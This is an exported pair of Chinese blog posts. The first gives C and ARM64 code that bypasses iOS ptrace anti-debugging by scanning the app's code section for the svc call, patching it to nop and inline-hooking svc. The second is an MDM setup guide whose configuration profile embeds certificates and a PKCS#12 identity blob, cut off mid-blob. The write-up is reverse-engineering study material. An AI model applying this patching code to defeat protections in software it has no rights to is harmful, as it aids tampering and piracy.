[{"title":"iOS inlinehook绕过反调试","date":"2019-09-10T08:02:54.000Z","path":"2019/09/10/anti-anti-debug-pro/anti-anti-debug-pro/","text":"iOS inlinehook绕过反调试开始之前写过一篇iOS LLDB中基于内存单指令patch实现反反调试介绍了在LLDB中如何通过单指令patch的方式去绕过ptrace来反调试。但后面还有一些情况没有解决：如果不是调用ptrace函数，而是直接编写内联汇编的方式，调用对应的系统调用来间接实现反调试，那么这种方式之前的那种办法就不再可行。本文就准备解决那种用内联汇编的反调试方式。 两种绕过方案这里有两种方案去绕过这种反调试： 静态内存匹配特征patch 实现一个简单的inlinehook动态hook绕过 静态内存匹配特征patch在介绍思路之前，先看下一遍内联汇编去实现反调试的代码 asm volatile( &quot;mov x0,#31\\n&quot; &quot;mov x1,#0\\n&quot; &quot;mov x2,#0\\n&quot; &quot;mov x3,#0\\n&quot; &quot;mov x16,#26\\n&quot; &quot;svc #128\\n&quot; ); 这里可以看出原理就是调用了26号系统调用，那么我们是不是可以去代码段里面去搜索，找到满足该特征的代码位置，然后直接将svc置为 nop不就可以了？下面引出两个问题，如何去遍历代码段以及如何去修改？ 获取代码段位置以及大小void getTextSegmentAddr(struct segmentRange *textSegRange){ int offset = 0; struct mach_header_64* header = (struct mach_header_64*)_dyld_get_image_header(0); if(header-&gt;magic != MH_MAGIC_64) { return ; } offset = sizeof(struct mach_header_64); int ncmds = header-&gt;ncmds; while(ncmds--) { /* go through all load command to find __TEXT segment*/ struct load_command * lcp = (struct load_command *)((uint8_t*)header + offset); offset += lcp-&gt;cmdsize; if(lcp-&gt;cmd == LC_SEGMENT_64) { struct segment_command_64 * curSegment = (struct segment_command_64 *)lcp; struct section_64* curSection = (struct section_64*)((uint8_t*)curSegment + sizeof(struct segment_command_64)); // check current section of segment is __TEXT? if(!strcmp(curSection-&gt;segname, &quot;__TEXT&quot;) &amp;&amp; !strcmp(curSection-&gt;sectname, &quot;__text&quot;)){ uint64_t memAddr = curSection-&gt;addr; textSegRange-&gt;start = memAddr + _dyld_get_image_vmaddr_slide(0); textSegRange-&gt;end = textSegRange-&gt;start + curSection-&gt;size; break; } } } return ; } 代码不复杂，就是动态解析了自身内存里面的macho文件，根据macho文件格式找到代码段LC_SEGMENT_64(_TEXT)然后就能得到__text的开始位置以及大小。 内存搜索匹配ptrace内联汇编代码void* lookup_ptrace_svc(void* target_addr, uint64_t size){ uint8_t * p = (uint8_t*)target_addr; for(int i = 0; i &lt; size ;i++ ){ /* mov x16, #0x1a -&gt; 0xd2800350 svc #0x80 -&gt; 0xd4001001 */ if (*((uint32_t*)p) == 0xd2800350 &amp;&amp; *((uint32_t*)p+1) == 0xd4001001) { return p; } p++; } return NULL; } 传入的就是代码段的地址以及大小，然后遍历整个代码段，找到满足以下ptrace特征汇编代码 mov x16, #0x1a -&gt; 0xd2800350 svc #0x80 -&gt; 0xd4001001 然后就返回该地址。 patch代码（将svc改为nop）iOS LLDB中基于内存单指令patch实现反反调试这篇文章介绍了如何去patch代码的原理，但当时遇到一个bug：在iOS11/12上面patch会失败，后面我花了一段时间去分析了失败的原因，后来也写了一篇文章去记录了分析的过程，感兴趣的可以访问iOS12内存patch remap bug分析 这里我就直接给出patch的代码 uint8_t patch_ins_data[4] = {0x1f, 0x20, 0x03, 0xd5}; // nop patchCode(ptrace_svc_p+4, patch_ins_data , 4); 完整流程代码如下 - (void)kill_anti_debug{ struct segmentRange textSegRange; getTextSegmentAddr(&amp;textSegRange); void* ptrace_svc_p = lookup_ptrace_svc((void*)textSegRange.start, textSegRange.end-textSegRange.start); if (!ptrace_svc_p) { ADDLOG(@&quot;[-] not found ptrace svc&quot;); return; } ADDXLOG(@&quot;[+] found ptrace svc # address=%p&quot;, ptrace_svc_p); char* ptrace_bytes = hex_dump((void*)ptrace_svc_p, 8); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, ptrace_svc_p, 8, ptrace_bytes); free(ptrace_bytes); ADDLOG(@&quot;[*] start to ptach ptrace svc to ret&quot;); uint8_t patch_ins_data[4] = {0x1f, 0x20, 0x03, 0xd5}; patchCode(ptrace_svc_p+4, patch_ins_data , 4); ADDLOG(@&quot;[*] ptach ptrace svc to nop done, read new value&quot;); ptrace_bytes = hex_dump((void*)ptrace_svc_p, 8); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, ptrace_svc_p, 8, ptrace_bytes); free(ptrace_bytes); } 通过比对前后的代码就发现svc出地址的代码已经变成了nop从而绕过了反调试 inlinehook动态hook绕过这种方式主要针对那些混淆了系统调用号或者其他编译版本，其绕过原理是直接hook svc指令，然后判断是否为26号系统调用（让其他系统调用正常执行），若满足就直接跳过svc指令。 整体流程代码如下 struct segmentRange textSegRange; getTextSegmentAddr(&amp;textSegRange); void* svc_p = lookup_svc_ins((void*)textSegRange.start, textSegRange.end-textSegRange.start); if (!svc_p) { ADDLOG(@&quot;[-] not found svc&quot;); return; } ADDXLOG(@&quot;[+] found svc # address=%p&quot;, svc_p); char* svc_bytes = hex_dump((void*)svc_p, 4); ADDXLOG(@&quot;[+] read ptrace svc ins address:%p size:0x%x inst_bytes:%s&quot;, svc_p, 4, svc_bytes); free(svc_bytes); xia0Hook(svc_p); 同样遍历代码段找到所有的svc指令，然后进行hook，下面看hook的具体实现 bool xia0Hook(void* target_addr){ int len = (int)sysconf(_SC_PAGESIZE); // 1. get target address page and patch offset unsigned long page_start = (unsigned long) (target_addr) &amp; ~PAGE_MASK; unsigned long patch_offset = (unsigned long)target_addr - page_start; printf(&quot;[*] Target address:%p Page start:%p Patch offset:%p&quot;, target_addr, (void*)page_start, (void*)patch_offset); // 2. map new page for patch void *new = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0); if (!new ){ printf(&quot;[-] mmap failed!&quot;); return false; } // 3.copy target 4 ins to new page int copy_size = 4*4; void* copy_from_addr = target_addr - copy_size; memcpy((void *)(new), copy_from_addr, copy_size); /* cmp x16, #0x1a b.ne loc_not_ptrace_svc_jmp ldr x17, #0x8 br x17 orig_svc_next_addr_1 orig_svc_next_addr_2 ldr x17, #0x8 br x17 orig_svc_addr_1 orig_svc_addr_2 */ uint64_t orig_svc_addr = (uint64_t)target_addr; uint64_t orig_svc_next_addr = (uint64_t)(target_addr+1*4); uint8_t check_jmp_data[] = {0x1f, 0x6a, 0x00, 0xf1, 0x51, 0x00, 0x00, 0x58, 0x20, 0x02, 0x1f, 0xd6, orig_svc_next_addr&amp;0xff, (orig_svc_next_addr&gt;&gt;8*1)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*2)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*3)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*4)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*5)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*6)&amp;0xff, (orig_svc_next_addr&gt;&gt;8*7)&amp;0xff, 0x51, 0x00, 0x00, 0x58, 0x20, 0x02, 0x1f, 0xd6, orig_svc_addr&amp;0xff, (orig_svc_addr&gt;&gt;8*1)&amp;0xff, (orig_svc_addr&gt;&gt;8*2)&amp;0xff, (orig_svc_addr&gt;&gt;8*3)&amp;0xff, (orig_svc_addr&gt;&gt;8*4)&amp;0xff, (orig_svc_addr&gt;&gt;8*5)&amp;0xff, (orig_svc_addr&gt;&gt;8*6)&amp;0xff, (orig_svc_addr&gt;&gt;8*7)&amp;0xff}; int check_jmp_data_size = 10*4; memcpy((void *)(new+4*4), check_jmp_data, check_jmp_data_size); // 4.patch target address to jmp hook code void* patch_addr = copy_from_addr; uint64_t new_p = (uint64_t)new; /* ldr x16, #0x8 br x16 hook_code_addr_1 hook_code_addr_2 */ uint8_t patch_data[] = {0x50, 0x00, 0x00, 0x58, 0x00, 0x02, 0x1f, 0xd6,new_p&amp;0xff, (new_p&gt;&gt;8*1)&amp;0xff, (new_p&gt;&gt;8*2)&amp;0xff, (new_p&gt;&gt;8*3)&amp;0xff, (new_p&gt;&gt;8*4)&amp;0xff, (new_p&gt;&gt;8*5)&amp;0xff, (new_p&gt;&gt;8*6)&amp;0xff, (new_p&gt;&gt;8*7)&amp;0xff}; int patch_data_size = 4*4; patchCode(patch_addr, patch_data, patch_data_size); // 5. set new page to r-x mprotect(new, len, PROT_READ | PROT_EXEC); return true; } 这里代码比较复杂，大致分为以下步骤 map一页内存new，后面会将hook的代码写到里面 copy原svc前的四条指令保存到new页（目前没有进行相对寻址修复） 将hook判断的代码写到紧接着前面四条指令的后面，汇编代码大致如下 cmp x16, #0x1a b.ne loc_not_ptrace_svc_jmp ldr x17, #0x8 br x17 orig_svc_next_addr_1 orig_svc_next_addr_2 ldr x17, #0x8 br x17 orig_svc_addr_1 orig_svc_addr_2 就是简单的判断了系统调用号是否为26，若满足就跳到svc的下一条指令，若不是则跳回原svc指令以保证其他系统调用正常执行。 patch目标地址进行hook跳转，由于进行任意地址跳转需要4条指令大小，所以这里覆盖了svc前的四条指令 ldr x16, #0x8 br x16 hook_code_addr_1 hook_code_addr_2 这里就是在执行svc指令前使其跳转到我们的hook代码 最后将new这页设置为可读不可写可执行的页属性 总结/Todo其实对于这种inlinehook去绕过调试，后面发现已经有人已经实现了，因为只要实现了inlinehook，肯定能hook代码绕过。不过我这里主要是想去自己分析以及实现这里面的很多细节。因为hook框架由于要考虑到稳定，兼容等等因素，所以往往代码不是很直接。而这里通过仅仅实现绕过反调试的需求，所以代码都比较通俗易懂，原理来说都是一样的。只有自己去动手写了代码才发现里面的乐趣所在，比如如何去实现系统调用的判断？如何解决寄存器污染?如何去实现代码段patch？当然还有很多汇编级别的坑存在，踩坑解决坑同样有意思，这里就不一一介绍。 后面主要还有两个事需要做： 相对寻址指令的修复问题，以及hook代码的稳定兼容扩展问题。 抽离相关代码，集成到xia0LLDB之中，真正实现调试器中一键绕过反调试。 参考 https://stackoverflow.com/questions/25286221/how-to-find-text-segment-range-in-ios https://github.com/coolstar/substitute http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/ http://4ch12dy.site/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/ http://4ch12dy.site/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"debug","slug":"debug","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"},{"name":"hook","slug":"hook","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"}]},{"title":"iOS MDM搭建实践指南","date":"2019-09-02T04:03:24.000Z","path":"2019/09/02/introduce-MDM-in-iOS/introduce-MDM-in-iOS/","text":"iOS MDM搭建实践指南 本文只介绍在iOS平台搭建MDM相关 开始MDM全称是移动设备管理，方便企业对员工的移动设备管理。在iOS中同样支持MDM功能，本文就介绍如何搭建MDM整个架构。实际上在2018年的时候我通过翻阅为数不多的资料，经过一番折腾才最终走通了整个流程。然而当时过于激动并没有写相关文档记录，经过一年没想到签名证书过期了，却忘记了整个搭建流程。于是重新回顾了一下，所以这次记录下整个过程，希望对后面的人有所帮助。 整体流程 获取Vendor p12证书 制作服务端推送证书 生成并签名设备描述文件 MDM通信指令结构及原理分析 企业MDM最佳方案 获取Vendor p12证书 制作MDM Vendor CSR 1、打开钥匙串 2、选择钥匙串访问-&gt;证书助理-&gt;从证书颁发机构请求证书 3、填写相关信息 4 、保存在本地 上传CSR文件到Apple 访问https://developer.apple.com/account/ios/certificate/create页面 将CSR文件上传到页面，等待1-2个工作日。 这时候你下载.cer文件，保存为mdmvendor.cer 导出MDM私钥 在钥匙串中打开mdmvendor.cer文件，然后右键选择导出并保存为private.p12文件 注意：这里生成的文件很重要，建议新建一个MDM目录保存 制作服务端推送证书生成证书签名请求文件 选择钥匙串访问-&gt;证书助理-&gt;从证书颁发机构请求证书 输入邮箱，姓名等信息 保存到本地为push.csr 导出MDM私钥和Vendor证书 取出私钥 执行下面的命令会要求输入private.p12的密码 openssl pkcs12 -in private.p12 -nocerts -out key.pem 去掉private.p12密码 openssl rsa -in key.pem -out private.key 取出证书文件 执行下面的命令会要求输入private.p12的密码 openssl pkcs12 -in private.p12 -clcerts -nokeys -out cert.pem 转为DES加密 openssl x509 -in cert.pem -inform PEM -out mdm.cer -outform DES 用mdmvendorsign工具生成applepush.csr我们需要mdmvendorsign工具中的/vendor/的相关代码文件，这里将上面的private.key, push.csr, 以及mdm.cer文件都复制到/vendor/目录。然后执行下面的命令 python mdm_vendor_sign.py --key private.key --csr push.csr --mdm mdm.cer --out applepush.csr 从apple获取推送证书将上面生成的applepush.csr文件上传到Apple’s Push Certificates Portal 然后下载推送证书，下载回来的证书在钥匙串中打开，你会看到以下信息 其中用户ID需要保存下来，后面会用到。并右键导出p12私钥。存为mdm.p12 将导出的p12私钥用下面命令生成服务器推送证书 openssl pkcs12 -in mdm.p12 -out PushCert.pem -nodes 然后将PushCert.pem拷贝到./Apple-iOS-MDM-Server/scripts/目录 生成并签名设备描述文件生成设备描述文件 用这个软件来制作Apple Configurator 2描述文件，但是现在新版本不支持直接生产MDM的描述文件，只能先做一个通用的描述文件，然后再增加MDM相关的字段。 生成的大概模板如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;ConsentText&lt;/key&gt; &lt;dict&gt; &lt;key&gt;default&lt;/key&gt; &lt;string&gt;install to enble DiDi manage your device&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;DevAuthCA.cer.der&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIEFzCCAv+gAwIBAgIIZylBveTSpRowDQYJKoZIhvcNAQELBQAw YjELMAkGA1UEBhMCVVMxEzARBgNVBAoTCkFwcGxlIEluYy4xJjAk BgNVBAsTHUFwcGxlIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MRYw FAYDVQQDEw1BcHBsZSBSb290IENBMB4XDTEzMDQyOTE4NDA1NFoX DTI4MDQyOTE4NDA1NFowgYsxOTA3BgNVBAMMMERldmVsb3BlciBB dXRoZW50aWNhdGlvbiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTEs MCoGA1UECwwjQXBwbGUgV29ybGR3aWRlIERldmVsb3BlciBSZWxh dGlvbnMxEzARBgNVBAoMCkFwcGxlIEluYy4xCzAJBgNVBAYTAlVT MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6rDzm76u 93aLqrS9hopNDa9oIjbzlWn62CLEsB4+GmzBJR6qK+ITfjbh6G0a /etrPsB/LYqUU4WAJiiZZqMWCLTkvD061OoGQFlZEt7fJu0plH49 08rzTUA4nd81towql+yjYJH9wSGgvDfg2QpsvXd5c2ITTjgSUfZR wSFHTYHA3Eoj/rpDuuar1RHxZsswxrdB8o8lHJuaShGHWFbsYfNC FUmFMAxZbA3ppTYwcaAD8/KjUM3AeJbVqToz81QhEYmfMYFpsb8x I5ae3MNmOlBaL169c+hUHFTtoUmzbRI1gnrXVKhLMsIpCngAvNEp X85mEOCnN2NCJQrk3Ig5cQIDAQABo4GmMIGjMB0GA1UdDgQWBBRJ 9jYJuBsj+gNbtuqCoNldEBhnBjAPBgNVHRMBAf8EBTADAQH/MB8G A1UdIwQYMBaAFCvQaUeUdgn+9GuNLkCm90dNfwheMC4GA1UdHwQn MCUwI6AhoB+GHWh0dHA6Ly9jcmwuYXBwbGUuY29tL3Jvb3QuY3Js MA4GA1UdDwEB/wQEAwIBBjAQBgoqhkiG92NkBgILBAIFADANBgkq hkiG9w0BAQsFAAOCAQEA1fKJRhfZZspW9+GqK8+E6ciXbsABciYm IvGy0snmeRN+e1KuFsoQmOXmdNY7SFvdb+2ZN/doOd5Es8hAih+3 VwHbac8YiFDXphpQshJJrtiOSBSsXBDgz0b4LjRqhtXdU9BB67nD Q2/zZSNKxvIqXqqsPQiKv/tctQH7kr3ogmZ4GkqjGgHWEocbTfOF pioDQ1xXP0eF/jn02cp9vnyAuyqpkybJYkaIAVUq2bRWV+9D6WLo 6/3X8AWOCj65GPgx+DLIDAD2yHJu1D9JuSqD5cD1AChpPUregUvi Uszq4TyJ7LjHi4/w1jbWrlbeObEp2lNcKFTKIkeSZ88IE2b25g== &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#1 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Developer Authentication Certification Authority&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1.A742C668-A859-4DB9-B7AD-5913CDACD1C9&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;A742C668-A859-4DB9-B7AD-5913CDACD1C9&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;AppleWWDRCAG2.cer&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIC9zCCAnygAwIBAgIIb+/Y9emjp+4wCgYIKoZIzj0EAwIwZzEb MBkGA1UEAwwSQXBwbGUgUm9vdCBDQSAtIEczMSYwJAYDVQQLDB1B cHBsZSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTETMBEGA1UECgwK QXBwbGUgSW5jLjELMAkGA1UEBhMCVVMwHhcNMTQwNTA2MjM0MzI0 WhcNMjkwNTA2MjM0MzI0WjCBgDE0MDIGA1UEAwwrQXBwbGUgV29y bGR3aWRlIERldmVsb3BlciBSZWxhdGlvbnMgQ0EgLSBHMjEmMCQG A1UECwwdQXBwbGUgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkxEzAR BgNVBAoMCkFwcGxlIEluYy4xCzAJBgNVBAYTAlVTMFkwEwYHKoZI zj0CAQYIKoZIzj0DAQcDQgAE3fC3BkvP3XMEE8RDiQOTgPte9nSt QmFSWAImUxnIYyIHCVJhysTZV+9tJmiLdJGMxPmAaCj8CWjwENrp 0C7JGqOB9zCB9DBGBggrBgEFBQcBAQQ6MDgwNgYIKwYBBQUHMAGG Kmh0dHA6Ly9vY3NwLmFwcGxlLmNvbS9vY3NwMDQtYXBwbGVyb290 Y2FnMzAdBgNVHQ4EFgQUhLaEzDqGYnIWWZToGqO9SN863wswDwYD VR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBS7sN6hWDOImqSKmd6+ veuv2sskqzA3BgNVHR8EMDAuMCygKqAohiZodHRwOi8vY3JsLmFw cGxlLmNvbS9hcHBsZXJvb3RjYWczLmNybDAOBgNVHQ8BAf8EBAMC AQYwEAYKKoZIhvdjZAYCDwQCBQAwCgYIKoZIzj0EAwIDaQAwZgIx ANmxxzHGI/ZPTdDZR8V9GGkRh3En02it4Jtlmr5s3z9GppAJvm6h OyywUYlBPIfSvwIxAPxkUolLPF2/axzCiZgvcq61m6oaCyNUd1To FUOixRLal1BzfF7QbrJcYlDXUfE6Wg== &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#1 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Apple Worldwide Developer Relations CA - G2&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1.32A40F6B-24FA-4026-9BF6-66AED47CEC40&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;32A40F6B-24FA-4026-9BF6-66AED47CEC40&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;AppleRootCA-G2.cer&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIFkjCCA3qgAwIBAgIIAeDltYNno+AwDQYJKoZIhvcNAQEMBQAw ZzEbMBkGA1UEAwwSQXBwbGUgUm9vdCBDQSAtIEcyMSYwJAYDVQQL DB1BcHBsZSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTETMBEGA1UE CgwKQXBwbGUgSW5jLjELMAkGA1UEBhMCVVMwHhcNMTQwNDMwMTgx MDA5WhcNMzkwNDMwMTgxMDA5WjBnMRswGQYDVQQDDBJBcHBsZSBS b290IENBIC0gRzIxJjAkBgNVBAsMHUFwcGxlIENlcnRpZmljYXRp b24gQXV0aG9yaXR5MRMwEQYDVQQKDApBcHBsZSBJbmMuMQswCQYD VQQGEwJVUzCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB ANgREkhI2imKScUcx+xuM23+TfvgHN6sXuI2pyT5f1BrTM65MFQn 5bPW7SXmMLYFN14UIhHF6Kob0vuy0gmVOKTvKkmMXT5xZgM4+xb1 hYjkWpIMBDLyyED7Ul+f9sDx47pFoFDVEovy3d6RhiPw9bZyLgHa C/YuOQhfGaFjQQscp5TBhsRTL3b2CtcM0YM/GlMZ81fVJ3/8E7j4 ko380yhDPLVoACVdJ2LT3VXdRCCQgzWTxb+4Gftr49wIQuavbfqe QMpOhYV4SbHXw8EwOTKrfl+q04tvny0aIWhwZ7Oj8ZhBbZF8+Nfb qOdfIRqMM78xdLe40fTgIvS/cjTf94FNcX1RoeKz8NMoFnNvzcyt N31O661A4T+B/fc9Cj6i8b0xlilZ3MIZgIxbdMYs0xBTJh0UT8TU gWY8h2czJxQI6bR3hDRSj4n4aJgXv8O7qhOTH11UL6jHfPsNFL4V PSQ08prcdUFmIrQB1guvkJ4M6mL4m1k8COKWNORj3rw31OsMiAND C1CvoDTdUE0V+1ok2Az6DGOeHwOx4e7hqkP0ZmUoNwIx7wHHHtHM n23KVDpA287PT0aLSmWaasZobNfMmRtHsHLDd4/E92GcdB/O/Wuh wpyUgquUoue9G7q5cDmVF8Up8zlYNPXEpMZ7YLlmQ1A/bmH8DvmG qmAMQ0uVAgMBAAGjQjBAMB0GA1UdDgQWBBTEmRNsGAPCe8CjoA1/ coB6HHcmjTAPBgNVHRMBAf8EBTADAQH/MA4GA1UdDwEB/wQEAwIB BjANBgkqhkiG9w0BAQwFAAOCAgEAUabz4vS4PZO/Lc4Pu1vhVRRO TtHlznldgX/+tvCHM/jvlOV+3Gp5pxy+8JS3ptEwnMgNCnWefZKV fhidfsJxaXwU6s+DDuQUQp50DhDNqxq6EWGBeNjxtUVAeKuowM77 fWM3aPbn+6/Gw0vsHzYmE1SGlHKy6gLti23kDKaQwFd1z4xCfVzm MX3zybKSaUYOiPjjLUKyOKimGY3xn83uamW8GrAlvacp/fQ+onVJ v57byfenHmOZ4VxG/5IFjPoeIPmGlFYl5bRXOJ3riGQUIUkhOb9i ZqmxospvPyFgxYnURTbImHy99v6ZSYA7LNKmp4gDBDEZt7Y6YUX6 yfIjyGNzv1aJMbDZfGKnexWoiIqrOEDCzBL/FePwN983csvMmOa/ orz6JopxVtfnJBtIRD6e/J/JzBrsQzwBvDR4yGn1xuZW7AYJNpDr FEobXsmII9oDMJELuDY++ee1KG++P+w8j2Ud5cAeh6Squpj9kuNs JnfdBrRkBof0Tta6SqoWqPQFZ2aWuuJVecMsXUmPgEkrihLHdoBR 37q9ZV0+N0djMenl9MU/S60EinpxLK8JQzcPqOMyT/RFtm2XNuyE 9QoB6he7hY1Ck3DDUOUUi78/w0EP3SIEIwiKum1xRKtzCTrJ+VKA Cd+66eYWyi4uTLLT3OUEVLLUNIAytbwPF+E= &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 CA 根证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Apple Root CA - G2&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.root.A0BB6B15-2A9E-47B8-9EC2-871F1C04DE8E&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.root&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;A0BB6B15-2A9E-47B8-9EC2-871F1C04DE8E&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Password&lt;/key&gt; &lt;string&gt;yourPWD&lt;/string&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;Identity.p12&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIINeQIBAzCCDT8GCSqGSIb3DQEHAaCCDTAEgg0sMIINKDCCB98G CSqGSIb3DQEHBqCCB9AwggfMAgEAMIIHxQYJKoZIhvcNAQcBMBwG CiqGSIb3DQEMAQYwDgQISPv8pCIqoMwCAggAgIIHmIW7JqMAsRYE Zb1bI8OK2QMWzR2ZAALxYRzvclL4Y4bhrxpK+muxPUj20lq3tR7L jORI5yz9h1b+iXw+DezIs3+2PzGK9bQ3LwXIT23eEStW6UfA958J u98w6XfupsFAUe/mrxw28eyP7hvG0BWzDIdO8pLJfKzyOROqsGRy guq3pBN+wZWqb/eyQRcod/nek12Ob0KcNcChtPgzgwLtbpRJ02lh cU9PYc9u+trKtdg8of6quZJoqwVMIkkbsNLrQ8bigS/FKo1Myx0J XlFiZaz+CjF5qs3VaSOtC1GDEhuJRnZHtTF/EvjinrhmrqG6iACz +R955Q2FYwM+FXhLTtQ5z1nZzZ3liWzXPGYIMA9RT+vYQdsNUBrL jmliJoGXqe2hxfSNaH6PCPEYwkoE0MQC7kZkS2i3bQLHykZbaZdS u+YxsqQ3Dl72EjTrYBTlOcfpE/7Vw/QurxSElZrV5hnb796zXKiX x0Bky25831mDW/ilA0IdQIJt5EAsU1FYqN5hNU3EpbNFl+sSNv4f YsDvm+91yDk2hWFots9AyEMTVan2HJgvqkV/MET+UTCXC9tAhEPu y2xubYvCF5HZVPsts+JjmgvIHKLsxGeBk6m2lUYrAKaQOURIjyTa dW8Hux1oDE7tQx1ounXmar9ELtFmxwEpQ/IyizkHLULwf3Lxtdfe tD4OghtvZGLv5uoJcdt0UnGsupmWNVtdKS7va7RLqwesut5FTt5x YgN06uRvKTI8CF0Oi7FihD5BG6/t7icAJvwcmaeur/UzLmAT/1ZN hU0VObzKlVKOpy2Ll0uwZfyn+J04vTxZ4vUId0bfpWwoOINU12c6 gr4k0HB2fK1ehiHJn4Cn6ap7tC4aD2sXIafPsfXIrXqNW2KGTMN1 Dc+S8HeoqX3d/wMqrDYeSJo8Dn6Zn6O60MnvwuljYcCmho7WHPN4 Pqvrnzpcg49wGQEs2G1ptlOCvcAIKTfCo4BZ4080cQe45TPIwnTJ Ajd7pmStvYB1ywzH9a4STaIQ1fBNtg7h+G8z19fsD8vdlEHcVwcV ButEhxUaxAhwK1Eee/1rmN4kQ5UT+zCCcNjIDeNHtd8PSMOFfZc6 aRL2mpbFa9IhkeKKuzt7cMx+Iqvvzl3NX+ZrJSqpiFtx7Cxi7uv9 nVETZAr9L8okYHGw4Se0ObrDelCKGSdLoR54HNrw9FEpQ0zfhtke PqG+whBBWsKrI0cwFNKp+AoMqHaGyr0lKNbD1cnbu1+ldA1aSoCQ Va035smpmGI9rCaLEbsBnnKpUJ/uDivWP8PlHZBkEumfG3jMQen+ ozPhZ19Mzcch8QG93qvFCZol/IupuURxyrXxN5XppF2OPsKC8/R2 N6Lrr9K/mr8alZ8X2FDk3y9cYCTJ4zu6cVSiVMOLtH2BrWXHilwC J9MY43IObHTndIHKwI7dCxA8ZOKuchRO4qxOgH5O8HUBcmWCfFtG ii0KSpwhGPrKiEy2Iu/ztiA03dvGn0hufFyYXNi1A0TkVkexqDZW XFGEsWxE6UCKpFurtpio7P9VwTMIW5w+yqmpx/ilhN+xbNZHETU1 tUSWgkpSm5WYh+69PkKMFIECZ0JRB6gfpfpgLGzScXrJcfCP4k/E ztE2NpwGdG9bQgv9lNyjPqP5aekEyK/gtWwIgBF9s01Wc1G3Pwnk V6KW1vlTRFzMIJi5YJmk/LdeH93uh4nHMp59QlNr0rSwMUMeY9UO NkqAO6aHvZF4BIsHJbVXg8DEIA9KWTjUWtw4ZhZu1KlltfGzctHX W6+Xa/jd6luANdlJ34yWXnmc9CmsEModagEVrYTJYVes2DEgeVtT +jtXqaSLlHUrHDzxJR/UyeiB3Zvs9GcFhR7vvrtC8J8pDbLhuoaw yhmXp86c6LjBUXzG3iwPh/7ehbuh4sZQMmmBPkqS90d/ct6ujZte qX2KKRoZxA46Wno4bzcWcDOm9JsvMzh5PUTu56xDx6VVvrILkoAK 6S7IqKMihA/My11IUpWBV6CMoAsLJeo/vDrIRTE21iV1LYIa2JSL 